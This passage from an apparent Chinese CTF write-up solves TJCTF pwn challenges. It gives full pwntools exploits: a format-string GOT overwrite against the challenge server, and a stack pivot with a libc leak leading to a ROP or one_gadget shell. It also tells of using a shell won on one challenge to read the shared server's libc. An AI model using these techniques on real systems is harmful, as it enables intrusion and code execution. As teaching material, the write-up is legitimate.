<p>所以我们修改got中puts、printf或者exit地址(但修改printf老是失效，不知道什么原因)来跳转到get_secret<br><strong>利用格式化漏洞修改GOT表中特定函数地址为get_secret函数地址：</strong><br>Exploit：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">e&#x3D;ELF(&quot;.&#x2F;secret&quot;)</span><br><span class="line">p&#x3D;remote(&#39;problem1.tjctf.org&#39;, 8008)</span><br><span class="line">secret_addr&#x3D;e.symbols[&quot;get_secret&quot;]</span><br><span class="line">puts_got_addr&#x3D;e.got[&quot;puts&quot;]</span><br><span class="line">payload&#x3D;p32(puts_got_addr)</span><br><span class="line">payload+&#x3D;p32(puts_got_addr+2)</span><br><span class="line">payload+&#x3D;&#39;%34571c&#39;</span><br><span class="line">payload+&#x3D;&#39;%35$n&#39;</span><br><span class="line">payload+&#x3D;&#39;%33009c&#39;</span><br><span class="line">payload+&#x3D;&#39;%36$n&#39;</span><br><span class="line">payload+&#x3D;&#39;\n&#39;</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;a&quot;)</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;a&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="0x0A-Super-Secure-Secrets"><a href="#0x0A-Super-Secure-Secrets" class="headerlink" title="0x0A Super Secure Secrets"></a>0x0A Super Secure Secrets</h3><p>可能有点非预期<br>题目和Secure Secrets有点像(实际上我先做的Super Secure Secrets)，不过没有了get_secret<br>题目没给libc文件<br>先看保护：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-d567b62886e3a546.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>No PIE<br>第一反应是利用ret2_dl_runtime_resolve<br>首先看到：<br>main:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  lets_not_be_friends(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  secure_service();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>secure_service函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 secure_service()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; &#x2F;&#x2F; [rsp+0h] [rbp-130h]</span><br><span class="line">  char v2; &#x2F;&#x2F; [rsp+20h] [rbp-110h]</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+A0h] [rbp-90h]</span><br><span class="line">  unsigned __int64 v4; &#x2F;&#x2F; [rsp+128h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Welcome to the Super Secure Service TM&quot;);</span><br><span class="line">  puts(&quot;FREE TRIAL VERSION -- Limited to viewing only one message.&quot;);</span><br><span class="line">  puts(&quot;Upgrade to PREMIUM for only $999!&quot;);</span><br><span class="line">  putchar(10);</span><br><span class="line">  print_help(10LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;&gt; &quot;);</span><br><span class="line">    fgets(&amp;s, 128, stdin);</span><br><span class="line">    switch ( s )</span><br><span class="line">    &#123;</span><br><span class="line">      case 104:</span><br><span class="line">        print_help(&amp;s);</span><br><span class="line">        continue;</span><br><span class="line">      case 115:</span><br><span class="line">        set_message(&amp;v2, &amp;v1);</span><br><span class="line">        continue;</span><br><span class="line">      case 117:</span><br><span class="line">        upgrade();</span><br><span class="line">        continue;</span><br><span class="line">      case 118:</span><br><span class="line">        get_message(&amp;v2, &amp;v1);</span><br><span class="line">        return __readfsqword(0x28u) ^ v4;</span><br><span class="line">      case 120:</span><br><span class="line">        return __readfsqword(0x28u) ^ v4;</span><br><span class="line">      default:</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>get_message:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall get_message(char *a1, const char *a2)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; &#x2F;&#x2F; [rsp+1Ch] [rbp-54h]</span><br><span class="line">  char v4[6]; &#x2F;&#x2F; [rsp+20h] [rbp-50h]</span><br><span class="line">  char v5; &#x2F;&#x2F; [rsp+26h] [rbp-4Ah]</span><br><span class="line">  char s2; &#x2F;&#x2F; [rsp+30h] [rbp-40h]</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+40h] [rbp-30h]</span><br><span class="line">  unsigned __int64 v8; &#x2F;&#x2F; [rsp+68h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Message Password:&quot;);</span><br><span class="line">  do</span><br><span class="line">    fgets(&amp;s, 32, stdin);</span><br><span class="line">  while ( strcmp(a2, &amp;s) );</span><br><span class="line">  puts(&quot;Secret Message:&quot;);</span><br><span class="line">  puts(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);</span><br><span class="line">  printf(a1, &amp;s, a2);</span><br><span class="line">  puts(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 5; ++i )</span><br><span class="line">    v4[i] &#x3D; byte_401238[rand() % 62];</span><br><span class="line">  v5 &#x3D; 0;</span><br><span class="line">  puts(&quot;As a free trial user, please complete the following captcha for our monitoring purposes.&quot;);</span><br><span class="line">  printf(&quot;Captcha: %s\n&quot;, v4);</span><br><span class="line">  fgets(&amp;s2, 7, stdin);</span><br><span class="line">  if ( !strcmp(v4, &amp;s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Thank you for your cooperation...&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    memset(a1, 0, 0x80uLL);</span><br><span class="line">    puts(&quot;Incorrect captcha, your message was removed from our database.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>get_message依然存在格式化字符串漏洞<br>a1可控<br>不过复用有些问题，首先考虑复用</p>
<h4 id="复用get-message"><a href="#复用get-message" class="headerlink" title="复用get_message"></a>复用get_message</h4><p>get_message后直接退出(因为读取一次信息)<br>且upgrade函数没有作用(无法升级功能)<br>这样我们只能获取一次地址，这样我们只能获取地址，无法在获取的同时确定需要修改的目标地址以及需要修改目标地址成什么数据<br>所以首先解决程序复用问题，当我们进入get_message<br>我们能确定的是rbp位置存放了secure_service的栈帧底部<br>我们无法确定将其修改成什么<br><strong>不过我们可以使用$hhn修改secure_service的rbp最后一位来使其适当变小来盲打返回地址：</strong><br>看到secure_service和main返回方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
<p>首先我们确定获取两个地址：栈地址和libc地址<br>栈地址获取get_message的ebp即可<br>对于libc地址，调试过程可以发现：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-5bf5a96683aae486.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="fgets_AD"><br>相对get_message特定某处永远是fgets+0xad的地址<br>(这里说一下非预期<br>中间因为有rbp的盲打，继续ret2_dl_runtime_resolve感觉有些麻烦<br>上面Online Banking，这题可以让我们拿到shell<br>然后因为题目同一域名，猜测是同一服务器<br>拿到shell后去readelf服务器的libc.so.6(或其他方法)即可获得libc的文件版本<br>所以这里采用ret2libc)<br>所以我们使用%17$16llx%20$16llx%20$hhn获取ebp&amp;&amp;fgets_AD_addr地址，并改变secure_servic的rbp的最后一位，来控制main返回时的rsp，这时候rsp会指向原ebp&amp;0xfffffffffffffff0+0x20(因为之前输出了0x20字节(为了对其内存))<br>这时候整体栈帧迁移向低一些的地址：<br>看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400DA0 var_130&#x3D; byte ptr -130h</span><br><span class="line">.text:0000000000400DA0 var_110&#x3D; byte ptr -110h</span><br><span class="line">.text:0000000000400DA0 s&#x3D; byte ptr -90h</span><br><span class="line">.text:0000000000400DA0 var_8&#x3D; qword ptr -8</span><br></pre></td></tr></table></figure>
<p>rsp会落到s(即我们输入的命令字符)<br>如果我们把这一片布置成secure_servic的某处地址，为了保证程序不会崩溃（维护rbp），选择跳转到secure_servic的mov  rbp,rsp处：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400DA1 mov     rbp, rsp</span><br></pre></td></tr></table></figure>
<p>(不过有时候原ebp末位太大或者太小会无法成功)</p>
<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>下面整个栈地址都可以通过调试得出<br>即可再次通过get_message的格式化字符串修改get_message返回地址<br>首先想到的是system(“/bin/sh”)<br>所以我们需要布置栈段,构造rop链调取system：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_message返回地址处:pop_rdi_ret-&gt;bin_sh_addr-&gt;system_addr</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary .&#x2F;super_secret  --ropchain</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x0000000000400e2f : adc eax, dword ptr [rax] ; jmp rax</span><br><span class="line">0x0000000000400759 : adc eax, dword ptr [rcx] ; add byte ptr [rax], al ; add rsp, 8 ; ret</span><br><span class="line">0x0000000000400dc7 : add al, bpl ; ret 0xfff9</span><br><span class="line">0x0000000000400dc8 : add al, ch ; ret 0xfff9</span><br><span class="line">0x0000000000400f9f : add bl, dh ; ret</span><br><span class="line">0x0000000000400f9d : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x0000000000400f9b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x0000000000400f1c : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x00000000004008dc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x0000000000400f9c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000400f1d : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class="line">0x000000000040075b : add byte ptr [rax], al ; add rsp, 8 ; ret</span><br><span class="line">0x0000000000400f1e : add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x000000000040146a : add byte ptr [rax], al ; movsd dword ptr [rdi], dword ptr [rsi] ; idiv edi ; jmp qword ptr [rax]</span><br><span class="line">0x00000000004008de : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x0000000000400f9e : add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000400948 : add byte ptr [rcx], al ; ret</span><br><span class="line">0x0000000000400f1f : add cl, cl ; ret</span><br><span class="line">0x0000000000400944 : add eax, 0x20176e ; add ebx, esi ; ret</span><br><span class="line">0x0000000000400e97 : add eax, 0xfff913e8 ; dec ecx ; ret</span><br><span class="line">0x0000000000400d55 : add eax, 0xfffa55e8 ; dec ecx ; ret</span><br><span class="line">0x0000000000400b0e : add eax, 0xfffc9ce8 ; dec ecx ; ret</span><br><span class="line">0x0000000000400949 : add ebx, esi ; ret</span><br><span class="line">0x0000000000400bdf : add esp, 0x28 ; pop rbx ; pop rbp ; ret</span><br><span class="line">0x000000000040075e : add esp, 8 ; ret</span><br><span class="line">0x0000000000400bde : add rsp, 0x28 ; pop rbx ; pop rbp ; ret</span><br><span class="line">0x000000000040075d : add rsp, 8 ; ret</span><br><span class="line">0x00000000004009ce : and byte ptr [rax - 0x77], cl ; ret 0x20be</span><br><span class="line">0x00000000004008d2 : and byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x0000000000400947 : and byte ptr [rax], al ; add ebx, esi ; ret</span><br><span class="line">0x0000000000400f79 : call qword ptr [r12 + rbx*8]</span><br><span class="line">0x0000000000400f7a : call qword ptr [rsp + rbx*8]</span><br><span class="line">0x000000000040096e : call rax</span><br><span class="line">0x0000000000400b77 : dec dword ptr [rax + 0x39] ; ret</span><br><span class="line">0x00000000004009ca : dec dword ptr [rax - 0x73] ; and byte ptr [rax - 0x77], cl ; ret 0x20be</span><br><span class="line">0x0000000000400a25 : dec dword ptr [rax - 0x73] ; xor byte ptr [rax - 0x77], cl ; ret 0x20be</span><br><span class="line">0x0000000000400b13 : dec ecx ; ret</span><br><span class="line">0x0000000000400f7c : fmul qword ptr [rax - 0x7d] ; ret</span><br><span class="line">0x000000000040146d : idiv edi ; jmp qword ptr [rax]</span><br><span class="line">0x0000000000400969 : int1 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x00000000004008cd : je 0x4008e8 ; pop rbp ; mov edi, 0x6020a0 ; jmp rax</span><br><span class="line">0x000000000040091b : je 0x400930 ; pop rbp ; mov edi, 0x6020a0 ; jmp rax</span><br><span class="line">0x0000000000400968 : je 0x400961 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x000000000040146f : jmp qword ptr [rax]</span><br><span class="line">0x00000000004008d5 : jmp rax</span><br><span class="line">0x0000000000400b14 : leave ; ret</span><br><span class="line">0x0000000000400943 : mov byte ptr [rip + 0x20176e], 1 ; ret</span><br><span class="line">0x0000000000400f1b : mov eax, 0 ; leave ; ret</span><br><span class="line">0x0000000000400e2b : mov eax, dword ptr [rax*8 + 0x4013b8] ; jmp rax</span><br><span class="line">0x000000000040096c : mov ebp, esp ; call rax</span><br><span class="line">0x00000000004008d0 : mov edi, 0x6020a0 ; jmp rax</span><br><span class="line">0x0000000000400f77 : mov edi, edi ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x0000000000400f76 : mov edi, r15d ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x0000000000400e2a : mov rax, qword ptr [rax*8 + 0x4013b8] ; jmp rax</span><br><span class="line">0x000000000040096b : mov rbp, rsp ; call rax</span><br><span class="line">0x000000000040146c : movsd dword ptr [rdi], dword ptr [rsi] ; idiv edi ; jmp qword ptr [rax]</span><br><span class="line">0x0000000000400bdd : nop ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000400ef5 : nop ; leave ; ret</span><br><span class="line">0x0000000000400d9d : nop ; pop rbp ; ret</span><br><span class="line">0x00000000004008d8 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x0000000000400f98 : nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x0000000000400925 : nop dword ptr [rax] ; pop rbp ; ret</span><br><span class="line">0x0000000000400f8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400f8e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400f90 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400f92 : pop r15 ; ret</span><br><span class="line">0x0000000000400942 : pop rbp ; mov byte ptr [rip + 0x20176e], 1 ; ret</span><br><span class="line">0x00000000004008cf : pop rbp ; mov edi, 0x6020a0 ; jmp rax</span><br><span class="line">0x0000000000400f8b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400f8f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008e0 : pop rbp ; ret</span><br><span class="line">0x0000000000400be2 : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000400f93 : pop rdi ; ret</span><br><span class="line">0x0000000000400f91 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400f8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040096a : push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400761 : ret</span><br><span class="line">0x00000000004009d1 : ret 0x20be</span><br><span class="line">0x0000000000400c9a : ret 0x48d</span><br><span class="line">0x0000000000400c8f : ret 0xc889</span><br><span class="line">0x0000000000400c96 : ret 0xd089</span><br><span class="line">0x0000000000400dca : ret 0xfff9</span><br><span class="line">0x0000000000400967 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax</span><br><span class="line">0x0000000000400be1 : sub byte ptr [rbx + 0x5d], bl ; ret</span><br><span class="line">0x0000000000400fa5 : sub esp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x0000000000400fa4 : sub rsp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x00000000004008da : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x0000000000400f9a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000400966 : test eax, eax ; je 0x400963 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400965 : test rax, rax ; je 0x400964 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400a29 : xor byte ptr [rax - 0x77], cl ; ret 0x20be</span><br></pre></td></tr></table></figure>
<p>为了简化利用过程，我们只需要修改返回地址<br>bin_sh_addr+system_addr何以用secure_service的set_message来布置，因为password的位置恰好在get_message返回地址的正下方<br>Exploit:（这里我利用了第一次的password来获取/bin/sh字符串，没有使用libc中的/bin/sh，因为最初没找到libc版本，只能在服务器readelf获取system偏移）（同时注意输入正确验证码，否则get_message会执行memset(a1, 0, 0x80uLL);）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p&#x3D;process(&quot;.&#x2F;super_secret&quot;)</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">payload1&#x3D;p64(0x000400DA1)*15</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;s&quot;)</span><br><span class="line">p.recvuntil(&quot;Password:\n&quot;)</span><br><span class="line">p.sendline(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">p.recvuntil(&quot;Message:\n&quot;)</span><br><span class="line">p.sendline(&quot;%17$16llx%20$16llx%20$hhn&quot;)</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;v&quot;)</span><br><span class="line">p.recvuntil(&quot;Password:\n&quot;)</span><br><span class="line">p.sendline(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">p.recvuntil(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;)</span><br><span class="line">key&#x3D;p.recvuntil(&quot;\n&quot;)</span><br><span class="line">fgets_AD_addr&#x3D;int(key[0:17],16)</span><br><span class="line">fgets_addr&#x3D;fgets_AD_addr-0xad</span><br><span class="line">system_addr&#x3D;fgets_addr-0x6dad0+0x000000000045390</span><br><span class="line">ebp_addr&#x3D;int(key[17:33],16)</span><br><span class="line">ebp_new&#x3D;(ebp_addr&amp;0xffffffffffffff00)+0x20+0x10</span><br><span class="line">bin_sh_addr&#x3D;ebp_addr-0x130</span><br><span class="line">pop_edi_ret&#x3D;0x0000000000400f93 </span><br><span class="line">p.recvuntil(&quot;Captcha: &quot;)</span><br><span class="line">ch&#x3D;p.recv()[:6]</span><br><span class="line">p.sendline(ch)</span><br><span class="line">payload&#x3D;p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&quot;s&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">retn_addr&#x3D;ebp_new-0x138</span><br><span class="line">print hex(retn_addr)</span><br><span class="line">payload3&#x3D;&quot;%3987c%28$hn%41c&quot;+p64(retn_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">print p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;v&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;Captcha: &quot;)</span><br><span class="line">ch&#x3D;p.recv()[:6]</span><br><span class="line">p.sendline(ch)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>在本地成功打到shell<br>不过远程总是报错：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout: the monitored command dumped core</span><br></pre></td></tr></table></figure>
<p>猜测是服务器端运行时环境变量的缘故<br>最后选择使用one_gadget获取执行execve(“/bin/sh”)的地址来打到shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget  .&#x2F;libc.so.6</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x4f2c5	execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rcx &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0x4f322	execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0x10a38c	execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] &#x3D;&#x3D; NULL</span><br></pre></td></tr></table></figure>
<p>修改pop rdi;ret后的system地址为execve(“/bin/sh”)的地址<br>最终远程打到shell:</p>
